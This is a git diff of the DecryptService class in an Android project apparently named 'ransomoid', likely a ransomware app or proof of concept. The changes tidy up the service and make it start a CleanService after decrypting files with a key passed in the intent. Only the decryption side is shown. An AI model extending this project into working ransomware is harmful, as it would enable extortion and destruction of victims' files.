@@ -12,6 +12,7 @@ import android.widget.Toast;
 import java.io.File;
 import java.util.ArrayList;
 
+import falezza.fabio.ransomoid.activities.DecryptActivity;
 import falezza.fabio.ransomoid.utils.AesEncrypter;
 import falezza.fabio.ransomoid.utils.FileProcessor;
 
@@ -26,15 +27,8 @@ public class DecryptService extends ParentService {
     @Override
     protected void onHandleIntent(Intent intent) {
         super.onHandleIntent(intent);
-
         this.key = intent.getDataString();
-
         this.decrypt();
-    }
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
     }
 
     private void decrypt() {
@@ -55,11 +49,11 @@ public class DecryptService extends ParentService {
             e.printStackTrace();
         }
         this.showMessage("DONE");
+        this.startCleanService();
     }
 
-    @Override
-    public IBinder onBind(Intent intent) {
-        // TODO: Return the communication channel to the service.
-        throw new UnsupportedOperationException("Not yet implemented");
+    public void startCleanService() {
+        Intent intent = new Intent(this, CleanService.class);
+        startService(intent);
     }
 }
